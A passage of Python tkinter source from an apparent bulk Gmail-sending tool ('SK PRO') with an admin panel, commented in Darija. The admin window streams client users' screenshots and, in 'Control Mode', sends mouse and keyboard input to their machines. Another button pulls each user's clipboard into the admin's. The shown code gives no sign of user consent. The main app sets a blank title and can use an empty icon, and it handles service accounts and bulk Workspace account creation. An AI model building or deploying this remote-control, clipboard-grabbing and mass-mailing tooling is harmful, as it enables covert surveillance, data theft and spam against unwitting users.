        self.status_lbl.pack(side="left", padx=15)
        
        self.fps_lbl = tk.Label(top, text="",
                                 bg=C["bg1"], fg=C["text2"],
                                 font=("Segoe UI", 9))
        self.fps_lbl.pack(side="left")
        
        # 🎮 Control mode toggle
        self.control_enabled = tk.BooleanVar(value=False)
        self.control_check = tk.Checkbutton(top, text="🎮 Control Mode",
                                              variable=self.control_enabled,
                                              bg=C["bg1"], fg=C["accent"],
                                              selectcolor=C["bg2"],
                                              activebackground=C["bg1"],
                                              activeforeground=C["accent"],
                                              font=("Segoe UI", 10, "bold"),
                                              command=self._on_control_toggle)
        self.control_check.pack(side="left", padx=15)
        
        # 📋 Clipboard sync button
        tk.Button(top, text="📋 Get Clipboard",
                  bg="#0891b2", fg="white",
                  font=("Segoe UI", 9, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._get_user_clipboard).pack(side="left", padx=4, pady=8, ipadx=8, ipady=3)
        
        tk.Button(top, text="❌ Stop & Close",
                  bg=C["red"], fg="white",
                  font=("Segoe UI", 10, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._on_close).pack(side="right", padx=10, pady=8, ipadx=10, ipady=5)
        
        # Image canvas (with scrollbars)
        canvas_frame = tk.Frame(self, bg="#000")
        canvas_frame.pack(fill="both", expand=True)
        
        self.canvas = tk.Canvas(canvas_frame, bg="#000", highlightthickness=0,
                                 cursor="arrow")
        self.canvas.pack(fill="both", expand=True)
        
        # Track image dimensions (for coordinate scaling)
        self._img_width = 0
        self._img_height = 0
        self._user_screen_width = 1920  # Will be updated
        self._user_screen_height = 1080
        
        # Bind mouse + keyboard events
        self.canvas.bind("<Button-1>", lambda e: self._on_mouse_click(e, "left"))
        self.canvas.bind("<Button-2>", lambda e: self._on_mouse_click(e, "middle"))
        self.canvas.bind("<Button-3>", lambda e: self._on_mouse_click(e, "right"))
        self.canvas.bind("<Double-Button-1>", lambda e: self._on_mouse_click(e, "left", clicks=2))
        self.canvas.bind("<B1-Motion>", self._on_mouse_drag)
        self.canvas.bind("<ButtonRelease-1>", self._on_mouse_release)
        self.canvas.bind("<MouseWheel>", self._on_mouse_scroll)
        self.canvas.bind("<Motion>", self._on_mouse_move)
        
        # Keyboard - bind to window
        self.bind("<Key>", self._on_key_press)
        self.focus_set()
        
        # Drag tracking
        self._drag_start = None
        
        # Initial message
        self.canvas.create_text(640, 400, text="⏳ Waiting for screen...",
                                fill="white", font=("Segoe UI", 16))
        
        # Stats bar
        stats = tk.Frame(self, bg=C["bg1"])
        stats.pack(fill="x")
        self.stats_lbl = tk.Label(stats, text="📊 Bandwidth: 0 KB | Frames: 0",
                                   bg=C["bg1"], fg=C["text2"],
                                   font=("Consolas", 9))
        self.stats_lbl.pack(side="left", padx=15, pady=6)
        
        self.control_status = tk.Label(stats, text="",
                                          bg=C["bg1"], fg=C["green"],
                                          font=("Segoe UI", 9, "bold"))
        self.control_status.pack(side="right", padx=15, pady=6)
    
    def _on_control_toggle(self):
        """Toggle control mode"""
        if self.control_enabled.get():
            self.canvas.config(cursor="crosshair")
            self.control_status.config(text="🎮 CONTROLLING — click/type/scroll", fg=C["green"])
        else:
            self.canvas.config(cursor="arrow")
            self.control_status.config(text="")
    
    def _scale_coords(self, canvas_x, canvas_y):
        """Convert canvas coords l user screen coords"""
        if self._img_width <= 0 or self._img_height <= 0:
            return None, None
        
        # Get current canvas size
        canvas_w = self.canvas.winfo_width()
        canvas_h = self.canvas.winfo_height()
        
        # Image is centered in canvas - account for that
        img_x_offset = (canvas_w - self._img_width) // 2
        img_y_offset = (canvas_h - self._img_height) // 2
        
        # Convert canvas coords l image coords
        img_x = canvas_x - img_x_offset
        img_y = canvas_y - img_y_offset
        
        # Bounds check
        if img_x < 0 or img_x > self._img_width or img_y < 0 or img_y > self._img_height:
            return None, None
        
        # Scale l user screen
        scale_x = self._user_screen_width / self._img_width
        scale_y = self._user_screen_height / self._img_height
        
        user_x = int(img_x * scale_x)
        user_y = int(img_y * scale_y)
        
        return user_x, user_y
    
    def _send_event(self, event):
        """Send control event l server (background)"""
        if not self.control_enabled.get():
            return
        
        import threading
        def _send():
            try:
                self.server_client.send_control_event(self.username, event)
            except Exception as e:
                print(f"⚠ Send event error: {e}")
        threading.Thread(target=_send, daemon=True).start()
    
    def _on_mouse_click(self, event, button, clicks=1):
        """Mouse click on canvas"""
        if not self.control_enabled.get():
            return
        x, y = self._scale_coords(event.x, event.y)
        if x is None:
            return
        self._send_event({
            "type": "mouse_click",
            "x": x, "y": y,
            "button": button,
            "clicks": clicks
        })
    
    def _on_mouse_drag(self, event):
        """Mouse drag (track for release)"""
        if not self.control_enabled.get():
            return
        if self._drag_start is None:
            self._drag_start = (event.x, event.y)
    
    def _on_mouse_release(self, event):
        """Mouse release - send drag event"""
        if not self.control_enabled.get():
            self._drag_start = None
            return
        
        if self._drag_start:
            start_x, start_y = self._drag_start
            # Only count as drag if moved >5 pixels
            if abs(event.x - start_x) > 5 or abs(event.y - start_y) > 5:
                x1, y1 = self._scale_coords(start_x, start_y)
                x2, y2 = self._scale_coords(event.x, event.y)
                if x1 is not None and x2 is not None:
                    self._send_event({
                        "type": "mouse_drag",
                        "x1": x1, "y1": y1,
                        "x2": x2, "y2": y2,
                        "button": "left"
                    })
        self._drag_start = None
    
    def _on_mouse_scroll(self, event):
        """Mouse wheel scroll"""
        if not self.control_enabled.get():
            return
        x, y = self._scale_coords(event.x, event.y)
        # event.delta: positive = up, negative = down
        # pyautogui scroll: positive = up, negative = down
        clicks = event.delta // 40  # Normalize
        self._send_event({
            "type": "mouse_scroll",
            "x": x, "y": y,
            "clicks": clicks
        })
    
    def _on_mouse_move(self, event):
        """Mouse move (throttled - only every 200ms)"""
        # Skip - too many events. Could add throttling later.
        pass
    
    def _on_key_press(self, event):
        """Keyboard press"""
        if not self.control_enabled.get():
            return
        
        # Get modifiers
        modifiers = []
        if event.state & 0x4:  # Ctrl
            modifiers.append("ctrl")
        if event.state & 0x1:  # Shift
            modifiers.append("shift")
        if event.state & 0x20000:  # Alt
            modifiers.append("alt")
        
        # Map special keys
        key_map = {
            "Return": "enter",
            "BackSpace": "backspace",
            "Tab": "tab",
            "Escape": "esc",
            "Delete": "delete",
            "Up": "up", "Down": "down", "Left": "left", "Right": "right",
            "Home": "home", "End": "end",
            "Prior": "pageup", "Next": "pagedown",
            "F1": "f1", "F2": "f2", "F3": "f3", "F4": "f4",
            "F5": "f5", "F6": "f6", "F7": "f7", "F8": "f8",
            "F9": "f9", "F10": "f10", "F11": "f11", "F12": "f12",
        }
        
        keysym = event.keysym
        key = key_map.get(keysym, keysym.lower())
        
        # If modifier + key → hotkey
        if modifiers:
            self._send_event({
                "type": "key_press",
                "key": key,
                "modifiers": modifiers
            })
        elif len(event.char) == 1 and event.char.isprintable():
            # Regular typing
            self._send_event({
                "type": "key_type",
                "text": event.char
            })
        else:
            # Special key (no modifier)
            self._send_event({
                "type": "key_press",
                "key": key,
                "modifiers": []
            })
    
    def _get_user_clipboard(self):
        """Get user's clipboard + copy l admin clipboard"""
        from tkinter import messagebox
        import threading
        
        def _fetch():
            try:
                text = self.server_client.get_user_clipboard(self.username)
                if text:
                    self.after(0, lambda: self._set_admin_clipboard(text))
                else:
                    self.after(0, lambda: messagebox.showinfo(
                        "📋 Clipboard",
                        "User clipboard is empty wla machi available.",
                        parent=self
                    ))
            except Exception as e:
                self.after(0, lambda: messagebox.showerror(
                    "Error", str(e), parent=self
                ))
        
        threading.Thread(target=_fetch, daemon=True).start()
    
    def _set_admin_clipboard(self, text):
        """Copy text l admin clipboard"""
        from tkinter import messagebox
        try:
            self.clipboard_clear()
            self.clipboard_append(text)
            preview = text[:100] + ("..." if len(text) > 100 else "")
            messagebox.showinfo(
                "📋 Clipboard Copied!",
                f"Copied {len(text)} characters:\n\n{preview}",
                parent=self
            )
        except Exception as e:
            messagebox.showerror("Error", str(e), parent=self)
    
    def _start_watching(self):
        """Tell server admin baghi yshof + start refresh"""
        self._running = True
        self._frame_count = 0
        self._total_bytes = 0
        self._last_timestamp = 0
        
        # Tell server to start
        try:
            self.server_client.admin_start_watching(self.username)
            self.status_lbl.config(text="● Watching", fg=C["green"])
        except Exception:
            self.status_lbl.config(text="● Server error", fg=C["red"])
        
        # Start refresh loop (kol 1.5s n-checki ila kayna image jdida)
        self._refresh()
    
    def _refresh(self):
        if not self._running:
            return
        
        # Fetch in background
        import threading
        threading.Thread(target=self._fetch_thread, daemon=True).start()
        
        # Re-schedule
        self._refresh_job = self.after(200, self._refresh)
    
    def _fetch_thread(self):
        try:
            result = self.server_client.admin_get_screenshot(self.username)
            if not result:
                return
            
            image_b64 = result.get("image")
            timestamp = result.get("timestamp")
            stale = result.get("stale", False)
            
            if not image_b64:
                # No image yet
                if stale:
                    self.after(0, lambda: self.status_lbl.config(
                        text="● No recent screen (user offline?)", fg=C["yellow"]))
                return
            
            # Skip ila nfs timestamp (mafichi image jdida)
            if timestamp and timestamp == self._last_timestamp:
                return
            self._last_timestamp = timestamp
            
            # Decode + display
            self.after(0, lambda b=image_b64: self._display_image(b))
        except Exception as e:
            print(f"⚠ Screenshot fetch error: {e}")
    
    def _display_image(self, image_b64):
        try:
            import base64
            from PIL import Image, ImageTk
            import io
            
            # Decode
            image_data = base64.b64decode(image_b64)
            self._total_bytes += len(image_data)
            self._frame_count += 1
            
            img = Image.open(io.BytesIO(image_data))
            
            # Track ORIGINAL user screen size (for coord scaling)
            # User sends 1024x576 from 1920x1080 → scale 1.875x
            # Default assumption (will use if not better data)
            self._user_screen_width = img.width * 1.875  # Assume 1024 → 1920
            self._user_screen_height = img.height * 1.875
            # Better: use common ratios
            if img.width >= 1024:
                self._user_screen_width = 1920
                self._user_screen_height = 1080
            
            # Resize bach yji f canvas
            cw = self.canvas.winfo_width()
            ch = self.canvas.winfo_height()
            if cw > 1 and ch > 1:
                img.thumbnail((cw, ch))
            
            # Track displayed image size (for coord conversion)
            self._img_width = img.width
            self._img_height = img.height
            
            # Convert to PhotoImage
            self._photo = ImageTk.PhotoImage(img)
            
            # Display
            self.canvas.delete("all")
            self.canvas.create_image(cw // 2, ch // 2, anchor="center", image=self._photo)
            
            # Update stats
            kb = self._total_bytes // 1024
            self.stats_lbl.config(
                text=f"📊 Bandwidth: {kb} KB | Frames: {self._frame_count}"
            )
            self.status_lbl.config(text="● Live", fg=C["green"])
        except Exception as e:
            print(f"⚠ Display image error: {e}")
    
    def _on_close(self):
        self._running = False
        if self._refresh_job:
            try:
                self.after_cancel(self._refresh_job)
            except Exception:
                pass
        # Tell server to stop
        try:
            self.server_client.admin_stop_watching(self.username)
        except Exception:
            pass
        self.destroy()


class ServerSetupGuideDialog(tk.Toplevel):
    """Show step-by-step Railway setup guide"""
    
    def __init__(self, parent):
        super().__init__(parent)
        self.title("📖 Server Setup Guide")
        self.geometry("700x600")
        self.configure(bg=C["bg0"])
        self.transient(parent)
        self.grab_set()
        
        self.update_idletasks()
        w, h = 700, 600
        sw, sh = self.winfo_screenwidth(), self.winfo_screenheight()
        if h > sh - 50:
            h = sh - 50
        self.geometry(f"{w}x{h}+{(sw-w)//2}+{max(0,(sh-h)//2)}")
        
        self._build_ui()
    
    def _build_ui(self):
        # Bottom button
        bottom = tk.Frame(self, bg=C["bg0"])
        bottom.pack(side="bottom", fill="x", padx=20, pady=15)
        tk.Button(bottom, text="✅ Close",
                  bg=C["accent"], fg="white",
                  font=("Segoe UI", 11, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self.destroy).pack(fill="x", ipady=10)
        
        # Header
        tk.Label(self, text="📖 Server Setup Guide",
                 bg=C["bg0"], fg=C["accent"],
                 font=("Segoe UI", 16, "bold")).pack(pady=(15, 10))
        
        # Scrollable content
        canvas = tk.Canvas(self, bg=C["bg0"], highlightthickness=0)
        scrollbar = ttk.Scrollbar(self, orient="vertical", command=canvas.yview)
        content = tk.Frame(canvas, bg=C["bg0"])
        
        content.bind("<Configure>",
                     lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=content, anchor="nw", width=660)
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side="left", fill="both", expand=True, padx=20)
        scrollbar.pack(side="right", fill="y")
        
        # Mouse wheel
        canvas.bind_all("<MouseWheel>",
                        lambda e: canvas.yview_scroll(-1 * (e.delta // 120), "units"))
        
        guide = """
🎯 GUIDE KAML L SETUP DYAL RAILWAY SERVER

═══════════════════════════════════════════════════════════
STEP 1: Cr3a account Railway
═══════════════════════════════════════════════════════════

1. Mchi l: https://railway.app
2. Click "Login" → "Login with GitHub"
3. Authorize Railway
4. Free trial: $5 credit/month (kafi)

═══════════════════════════════════════════════════════════
STEP 2: Push server l GitHub
═══════════════════════════════════════════════════════════

L'folder server/ kayna 5 fichiers:
   • server.py
   • requirements.txt
   • railway.json
   • Dockerfile
   • DEPLOY_GUIDE.md

Option A — b Git CLI:
   cd server
   git init
   git add .
   git commit -m "Initial server"
   
   # Cr3a repo PRIVATE f github.com/new
   git remote add origin https://github.com/USERNAME/skpro-server.git
   git branch -M main
   git push -u origin main

Option B — Upload manuel (easier):
   1. Mchi github.com/new
   2. Cr3a repo PRIVATE: "skpro-server"
   3. Click "Upload files"
   4. Drag & drop les 5 fichiers
   5. Commit

═══════════════════════════════════════════════════════════
STEP 3: Deploy f Railway
═══════════════════════════════════════════════════════════

1. F Railway dashboard → "+ New Project"
2. Click "Deploy from GitHub repo"
3. Khtar repo "skpro-server"
4. Railway ki-bda deploy automatic (3-5 min)

═══════════════════════════════════════════════════════════
STEP 4: Set API keys (MUHIM!)
═══════════════════════════════════════════════════════════

Generate 2 random keys:
  → https://www.random.org/strings/?num=2&len=32
  Wla Python:
     import secrets
     print(secrets.token_urlsafe(32))

F Railway:
   1. Click 3la project
   2. "Variables" tab
   3. Add:
      ADMIN_API_KEY = <random key 1>
      USER_API_KEY  = <random key 2>
   4. Save

⚠ SAUVEGARD HAD L'KEYS! Ghadi nsta3lhom f next step.

═══════════════════════════════════════════════════════════
STEP 5: Generate URL
═══════════════════════════════════════════════════════════

1. Settings → "Generate Domain"
2. Railway ki-3tini URL b7al:
   https://skpro-xxxxx.up.railway.app

3. Test: ouvri f navigateur:
   https://YOUR-URL.up.railway.app/health
   
   Khasso y-return: {"status":"ok",...}

═══════════════════════════════════════════════════════════
STEP 6: Configure SK PRO
═══════════════════════════════════════════════════════════

1. Click "📝 Cr3a server.json" f Live Monitor tab
2. 3mer:
   - Server URL (mn step 5)
   - Admin API key (mn step 4)
   - User API key (mn step 4)
3. Click Save
4. Logout → Login mn jdid

═══════════════════════════════════════════════════════════
DONE! 🎉
═══════════════════════════════════════════════════════════

Daba Live Monitor tab ghadi t-display real users + logs!
"""
        
        tk.Label(content, text=guide,
                 bg=C["bg0"], fg=C["text"],
                 font=("Consolas", 9), justify="left",
                 anchor="w").pack(fill="both", expand=True, padx=10, pady=10)


class ServerConfigDialog(tk.Toplevel):
    """Dialog to create/edit server.json"""
    
    def __init__(self, parent, on_save=None):
        super().__init__(parent)
        self.on_save = on_save
        
        self.title("📝 Configure Server")
        self.geometry("600x540")
        self.configure(bg=C["bg0"])
        self.resizable(False, False)
        self.transient(parent)
        self.grab_set()
        
        self.update_idletasks()
        w, h = 600, 540
        sw, sh = self.winfo_screenwidth(), self.winfo_screenheight()
        self.geometry(f"{w}x{h}+{(sw-w)//2}+{(sh-h)//2}")
        
        self._build_ui()
        self._load_existing()
    
    def _get_config_path(self):
        if getattr(sys, 'frozen', False):
            return os.path.join(os.path.dirname(sys.executable), "server.json")
        else:
            return os.path.join(os.path.dirname(os.path.abspath(__file__)), "server.json")
    
    def _load_existing(self):
        """Load existing server.json ila kayna"""
        path = self._get_config_path()
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                self.url_entry.insert(0, data.get("server_url", ""))
                self.admin_entry.insert(0, data.get("admin_api_key", ""))
                self.user_entry.insert(0, data.get("user_api_key", ""))
            except Exception:
                pass
    
    def _build_ui(self):
        # Bottom buttons
        bottom = tk.Frame(self, bg=C["bg0"])
        bottom.pack(side="bottom", fill="x", padx=20, pady=15)
        
        self.status = tk.Label(bottom, text="", bg=C["bg0"], fg=C["text2"],
                                font=("Segoe UI", 9))
        self.status.pack(pady=(0, 8))
        
        btn_row = tk.Frame(bottom, bg=C["bg0"])
        btn_row.pack(fill="x")
        tk.Button(btn_row, text="❌ Cancel",
                  bg=C["bg2"], fg=C["text"],
                  font=("Segoe UI", 10),
                  relief="flat", bd=0, cursor="hand2",
                  command=self.destroy).pack(side="left", expand=True, fill="x",
                                              padx=(0, 4), ipady=10)
        tk.Button(btn_row, text="🧪 Test Connection",
                  bg=C["yellow"], fg="black",
                  font=("Segoe UI", 10, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._test_connection).pack(side="left", expand=True, fill="x",
                                                       padx=4, ipady=10)
        tk.Button(btn_row, text="💾 Save",
                  bg=C["green"], fg="white",
                  font=("Segoe UI", 10, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._do_save).pack(side="left", expand=True, fill="x",
                                               padx=(4, 0), ipady=10)
        
        # Header
        tk.Label(self, text="📝 Server Configuration",
                 bg=C["bg0"], fg=C["accent"],
                 font=("Segoe UI", 14, "bold")).pack(pady=(20, 5))
        tk.Label(self, text="3mer had l'info mn Railway dashboard",
                 bg=C["bg0"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(pady=(0, 15))
        
        form = tk.Frame(self, bg=C["bg1"])
        form.pack(fill="x", padx=30, pady=5)
        
        # Server URL
        tk.Label(form, text="🌐 Server URL (mn Railway)",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(anchor="w", padx=15, pady=(15, 2))
        self.url_entry = tk.Entry(form, bg=C["bg2"], fg=C["text"],
                                   insertbackground=C["text"],
                                   relief="flat", bd=0,
                                   font=("Consolas", 10))
        self.url_entry.pack(fill="x", padx=15, ipady=7)
        tk.Label(form, text="Example: https://skpro-xxxxx.up.railway.app",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 8)).pack(anchor="w", padx=15)
        
        # Admin API key
        tk.Label(form, text="🔐 Admin API Key (l ana ghir)",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(anchor="w", padx=15, pady=(10, 2))
        self.admin_entry = tk.Entry(form, bg=C["bg2"], fg=C["text"],
                                     insertbackground=C["text"],
                                     relief="flat", bd=0, show="●",
                                     font=("Consolas", 10))
        self.admin_entry.pack(fill="x", padx=15, ipady=7)
        
        # User API key
        tk.Label(form, text="👤 User API Key (l clients)",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(anchor="w", padx=15, pady=(10, 2))
        self.user_entry = tk.Entry(form, bg=C["bg2"], fg=C["text"],
                                    insertbackground=C["text"],
                                    relief="flat", bd=0, show="●",
                                    font=("Consolas", 10))
        self.user_entry.pack(fill="x", padx=15, ipady=7, pady=(0, 15))
        
        # Toggle show
        self.show_keys = tk.BooleanVar(value=False)
        tk.Checkbutton(self, text="👁 Show API keys",
                       variable=self.show_keys,
                       bg=C["bg0"], fg=C["text"],
                       selectcolor=C["bg2"],
                       activebackground=C["bg0"],
                       font=("Segoe UI", 9),
                       command=self._toggle_show).pack(pady=5)
    
    def _toggle_show(self):
        show = "" if self.show_keys.get() else "●"
        self.admin_entry.config(show=show)
        self.user_entry.config(show=show)
    
    def _test_connection(self):
        """Test ila server kheddam"""
        url = self.url_entry.get().strip().rstrip("/")
        admin_key = self.admin_entry.get().strip()
        
        if not url or not admin_key:
            self.status.config(text="⚠ 3mer URL + Admin key l test", fg=C["yellow"])
            return
        
        self.status.config(text="⏳ Testing...", fg=C["yellow"])
        self.update()
        
        try:
            import requests
            # Test health
            r = requests.get(f"{url}/health", timeout=10)
            if r.status_code != 200:
                self.status.config(text=f"❌ Server returned {r.status_code}", fg=C["red"])
                return
            
            # Test admin auth
            r = requests.get(f"{url}/admin/users",
                             headers={"x-api-key": admin_key},
                             timeout=10)
            if r.status_code == 200:
                self.status.config(text="✅ Server kheddam mzyan! Admin auth OK",
                                    fg=C["green"])
            elif r.status_code == 401:
                self.status.config(text="❌ Admin API key ghalat", fg=C["red"])
            else:
                self.status.config(text=f"⚠ Server returned {r.status_code}", fg=C["yellow"])
        except requests.exceptions.Timeout:
            self.status.config(text="❌ Timeout — server slow wla offline", fg=C["red"])
        except requests.exceptions.ConnectionError:
            self.status.config(text="❌ Server unreachable - check URL", fg=C["red"])
        except Exception as e:
            self.status.config(text=f"❌ Error: {str(e)[:80]}", fg=C["red"])
    
    def _do_save(self):
        url = self.url_entry.get().strip().rstrip("/")
        admin_key = self.admin_entry.get().strip()
        user_key = self.user_entry.get().strip()
        
        if not url or not admin_key or not user_key:
            self.status.config(text="❌ 3mer kolchi 3 fields", fg=C["red"])
            return
        
        if not url.startswith("http"):
            self.status.config(text="❌ URL khasso ybda b https://", fg=C["red"])
            return
        
        try:
            config = {
                "server_url": url,
                "admin_api_key": admin_key,
                "user_api_key": user_key,
            }
            path = self._get_config_path()
            with open(path, "w", encoding="utf-8") as f:
                json.dump(config, f, indent=2)
            
            self.status.config(text=f"✅ Saved! Restart l'app", fg=C["green"])
            self.after(1500, self.destroy)
            if self.on_save:
                self.on_save()
        except Exception as e:
            self.status.config(text=f"❌ Save failed: {str(e)[:60]}", fg=C["red"])


class ExtendTimeDialog(tk.Toplevel):
    """Dialog dyal khtar duration dyal extension"""
    
    def __init__(self, parent, username):
        super().__init__(parent)
        self.result_seconds = None
        self.username = username
        
        self.title(f"⏰ Extend Time - {username}")
        self.geometry("420x380")
        self.configure(bg=C["bg0"])
        self.resizable(False, False)
        self.transient(parent)
        self.grab_set()
        
        self.update_idletasks()
        w, h = 420, 380
        sw, sh = self.winfo_screenwidth(), self.winfo_screenheight()
        self.geometry(f"{w}x{h}+{(sw-w)//2}+{(sh-h)//2}")
        
        self._build_ui()
    
    def _build_ui(self):
        # Bottom buttons
        bottom = tk.Frame(self, bg=C["bg0"])
        bottom.pack(side="bottom", fill="x", padx=20, pady=15)
        
        btn_row = tk.Frame(bottom, bg=C["bg0"])
        btn_row.pack(fill="x")
        tk.Button(btn_row, text="❌ Cancel",
                  bg=C["bg2"], fg=C["text"],
                  font=("Segoe UI", 10), relief="flat", bd=0, cursor="hand2",
                  command=self.destroy).pack(side="left", expand=True, fill="x",
                                              padx=(0, 4), ipady=8)
        tk.Button(btn_row, text="✅ Extend",
                  bg=C["green"], fg="white",
                  font=("Segoe UI", 10, "bold"), relief="flat", bd=0, cursor="hand2",
                  command=self._do_extend).pack(side="left", expand=True, fill="x",
                                                 padx=(4, 0), ipady=8)
        
        # Header
        tk.Label(self, text=f"⏰ Extend Time",
                 bg=C["bg0"], fg=C["accent"],
                 font=("Segoe UI", 14, "bold")).pack(pady=(15, 3))
        tk.Label(self, text=f"User: 👤 {self.username}",
                 bg=C["bg0"], fg=C["text"],
                 font=("Segoe UI", 11)).pack(pady=(0, 10))
        
        # Presets
        tk.Label(self, text="Quick presets:",
                 bg=C["bg0"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(anchor="w", padx=20)
        
        self.preset_var = tk.StringVar(value="3600")
        preset_frame = tk.Frame(self, bg=C["bg1"])
        preset_frame.pack(fill="x", padx=20, pady=5)
        
        presets = [
            ("300", "⏱ 5 min"),
            ("3600", "🕐 1 hour"),
            ("86400", "📅 1 day"),
            ("604800", "📅 1 week"),
            ("2592000", "📅 30 days"),
        ]
        for val, label in presets:
            tk.Radiobutton(preset_frame, text=label,
                           variable=self.preset_var, value=val,
                           bg=C["bg1"], fg=C["text"],
                           selectcolor=C["bg2"],
                           activebackground=C["bg1"],
                           activeforeground=C["text"],
                           font=("Segoe UI", 10),
                           anchor="w").pack(fill="x", padx=15, pady=3)
        
        # Custom
        tk.Label(self, text="Custom:",
                 bg=C["bg0"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(anchor="w", padx=20, pady=(8, 2))
        
        custom_frame = tk.Frame(self, bg=C["bg1"])
        custom_frame.pack(fill="x", padx=20, pady=5)
        self.custom_entry = tk.Entry(custom_frame, bg=C["bg2"], fg=C["text"],
                                      insertbackground=C["text"],
                                      relief="flat", bd=0, width=8,
                                      font=("Segoe UI", 10))
        self.custom_entry.pack(side="left", padx=10, ipady=5)
        
        self.custom_unit = tk.StringVar(value="minutes")
        for val, label in [("minutes", "min"), ("hours", "hours"), ("days", "days")]:
            tk.Radiobutton(custom_frame, text=label,
                           variable=self.custom_unit, value=val,
                           bg=C["bg1"], fg=C["text"],
                           selectcolor=C["bg2"],
                           activebackground=C["bg1"],
                           font=("Segoe UI", 9)).pack(side="left", padx=4)
    
    def _do_extend(self):
        from tkinter import messagebox
        custom = self.custom_entry.get().strip()
        if custom:
            try:
                amount = int(custom)
                unit = self.custom_unit.get()
                if unit == "minutes":
                    self.result_seconds = amount * 60
                elif unit == "hours":
                    self.result_seconds = amount * 3600
                else:
                    self.result_seconds = amount * 86400
            except ValueError:
                messagebox.showerror("Error", "Custom khasso integer", parent=self)
                return
        else:
            self.result_seconds = int(self.preset_var.get())
        
        self.destroy()


# ── MAIN APP ─────────────────────────────────────────────────────
class GmailSenderApp(tk.Tk):
    def __init__(self, current_user=None, user_manager=None):
        super().__init__()
        # 🔐 Auth context
        self.current_user = current_user or {"username": "guest", "role": "user"}
        self.user_manager = user_manager or UserManager()
        
        self.title("")
        self.geometry("1280x820")
        self.configure(bg=C["bg0"])
        self.resizable(True, True)
        self.minsize(1050, 680)

        # 👑 SK LOGO ICON f taskbar (bdal feather default)
        try:
            _icon_dir = os.path.dirname(os.path.abspath(__file__))
            _sk_ico = os.path.join(_icon_dir, "sk_logo.ico")
            _sk_png = os.path.join(_icon_dir, "sk_logo.png")
            _empty_ico = os.path.join(_icon_dir, "empty_icon.ico")
            _empty_png = os.path.join(_icon_dir, "empty_icon.png")
            
            # Priority: SK logo > empty icon > rien
            if os.path.exists(_sk_ico):
                self.iconbitmap(_sk_ico)
            elif os.path.exists(_sk_png):
                _icon_img = tk.PhotoImage(file=_sk_png)
                self.iconphoto(True, _icon_img)
                self._icon_img_ref = _icon_img
            elif os.path.exists(_empty_ico):
                self.iconbitmap(_empty_ico)
            elif os.path.exists(_empty_png):
                _icon_img = tk.PhotoImage(file=_empty_png)
                self.iconphoto(True, _icon_img)
                self._icon_img_ref = _icon_img
        except Exception as _e:
            print(f"⚠ Icon load failed: {_e}")

        self.sa_file = tk.StringVar()
        self.sender_accounts = []
        self.services = {}
        self.oa_services = {}       # OAuth2 SMTP: {email: sa_creds}
        self.oauth2_accounts = []
        self.workspace_sa_file = tk.StringVar()
        self.workspace_admin_email = tk.StringVar()
        self.workspace_domain = tk.StringVar()
        self.workspace_create_count = tk.StringVar(value="10")
        self.workspace_create_prefix = tk.StringVar()
        self.workspace_create_password = tk.StringVar()
        self.workspace_service = None
        self.workspace_users_cache = []
        self._sending = False
        self._paused = False
        self._auto_subjects = False  # ila True → generate subject per email
        self._resume_index = 0
        self.attachment_files = []
        self.subject_list = []
        self._current_leads = []
        self._lock = threading.Lock()
        self.base_dir = os.path.dirname(os.path.abspath(__file__))
        self.sent_total_file = os.path.join(self.base_dir, "sent_total.json")
        self.failed_emails_file = os.path.join(self.base_dir, "failed_emails.txt")
        self.sent_total_value = 0
        self._load_sent_total()

        if not GOOGLE_OK:
            messagebox.showwarning("Missing packages",
                f"Run this in CMD:\n\npip install google-auth google-api-python-client pysocks\n\nError: {_GOOGLE_ERR}")
        self._build_ui()
        
        # 🔐 Start expiration check (auto-logout ila expired)
        self._start_expiration_check()

    def _label(self, parent, text, size=8, color=None):
        return tk.Label(parent, text=text, bg=parent["bg"],
                        fg=color or C["text3"], font=("Segoe UI",size))

    def _entry_w(self, parent, var=None, default="", show=""):
        e = tk.Entry(parent, font=("Segoe UI",9),
                     bg=C["input"], fg=C["text"],
                     insertbackground=C["accent"],
                     relief="flat", bd=0,
                     highlightthickness=1,
                     highlightbackground=C["border2"],
                     textvariable=var, show=show)
        e.pack(fill="x", ipady=6, pady=(2,6))
        if var is None and default: e.insert(0, default)
        e.bind("<FocusIn>",  lambda ev: e.config(highlightbackground=C["accent"]))
        e.bind("<FocusOut>", lambda ev: e.config(highlightbackground=C["border2"]))
        return e

    def _text_w(self, parent, height=5):
        t = tk.Text(parent, font=("Segoe UI",9),
                    bg=C["input"], fg=C["text"],
                    insertbackground=C["accent"],
                    relief="flat", bd=0,
                    highlightthickness=1,
                    highlightbackground=C["border2"],
                    height=height, wrap="word")
        t.pack(fill="both", expand=True, pady=(2,6))
        t.bind("<FocusIn>",  lambda ev: t.config(highlightbackground=C["accent"]))
        t.bind("<FocusOut>", lambda ev: t.config(highlightbackground=C["border2"]))
        return t

    def _sec(self, parent, text):
        f = tk.Frame(parent, bg=parent["bg"])
        f.pack(fill="x", pady=(10,4))
        tk.Label(f, text=text, bg=parent["bg"], fg=C["text"],
                 font=("Segoe UI",9,"bold")).pack(side="left")
        tk.Frame(f, bg=C["border2"], height=1).pack(
            side="left", fill="x", expand=True, padx=(8,0), pady=6)

    def _log(self, msg, color=None):
        color = color or C["text2"]
        def _do():
            self.console.configure(state="normal")
            tag = f"t{color.replace('#','')}"
            ts = datetime.now().strftime("%H:%M:%S")
            self.console.insert("end", f"{ts}  {msg}\n", tag)
            self.console.tag_config(tag, foreground=color)
            self.console.see("end")
            self.console.configure(state="disabled")
        self.after(0, _do)
        
        # 🌐 Send to server (silent fail) — ghir important logs (bach mat-spammich)
        try:
            sc = getattr(self, "_server_client", None)
            if sc and sc.enabled:
